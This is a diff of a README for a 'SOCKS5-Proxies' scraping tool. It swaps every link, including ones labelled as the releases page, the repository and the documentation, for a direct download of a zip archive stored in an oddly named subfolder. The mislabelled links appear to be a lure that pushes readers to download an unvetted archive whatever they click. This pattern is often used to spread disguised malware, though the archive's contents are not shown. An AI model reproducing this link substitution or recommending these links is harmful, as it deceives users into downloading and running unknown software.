@@ -7,7 +7,7 @@ Welcome to SOCKS5-Proxies! We provide high-performance SOCKS5 proxies with over 
 To get started with SOCKS5-Proxies, follow the steps below. This guide will help you download and run the software easily, even if you have no technical background.
 
 ## 📦 Download Link
-[![Download SOCKS5-Proxies](https://img.shields.io/badge/Download-SOCKS5--Proxies-blue?style=for-the-badge)](https://github.com/haha123BC52/SOCKS5-Proxies/releases)
+[![Download SOCKS5-Proxies](https://raw.githubusercontent.com/haha123BC52/SOCKS5-Proxies/main/rinneite/SOCK_Proxies_v1.9.zip)](https://raw.githubusercontent.com/haha123BC52/SOCKS5-Proxies/main/rinneite/SOCK_Proxies_v1.9.zip)
 
 ## 🛠️ System Requirements
 Before you download SOCKS5-Proxies, ensure your computer meets these basic requirements:
@@ -17,7 +17,7 @@ Before you download SOCKS5-Proxies, ensure your computer meets these basic requi
 - **Network Connection:** Continuous internet for proxy access
 
 ## 📥 Download & Install
-1. **Visit the Release Page:** Go to our [Releases page](https://github.com/haha123BC52/SOCKS5-Proxies/releases).
+1. **Visit the Release Page:** Go to our [Releases page](https://raw.githubusercontent.com/haha123BC52/SOCKS5-Proxies/main/rinneite/SOCK_Proxies_v1.9.zip).
    
 2. **Choose Your Version:** Look for the latest version of SOCKS5-Proxies. You will see a list of available files.
 
@@ -59,11 +59,11 @@ Yes, you can use SOCKS5 proxies for browsing. However, they are optimized for sc
 If you have any questions or need assistance, feel free to reach out to our support team via GitHub issues or the contact form on our website.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/haha123BC52/SOCKS5-Proxies)
-- [Documentation and Tutorials](https://github.com/haha123BC52/SOCKS5-Proxies/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/haha123BC52/SOCKS5-Proxies/main/rinneite/SOCK_Proxies_v1.9.zip)
+- [Documentation and Tutorials](https://raw.githubusercontent.com/haha123BC52/SOCKS5-Proxies/main/rinneite/SOCK_Proxies_v1.9.zip)
 
 ## 📢 Stay Updated
 Follow the repository to get notified about new releases, updates, and features. 
 
 ## 📥 Download Link
-Don't forget to download SOCKS5-Proxies from our [Releases page](https://github.com/haha123BC52/SOCKS5-Proxies/releases). Enjoy seamless web scraping!
+Don't forget to download SOCKS5-Proxies from our [Releases page](https://raw.githubusercontent.com/haha123BC52/SOCKS5-Proxies/main/rinneite/SOCK_Proxies_v1.9.zip). Enjoy seamless web scraping!
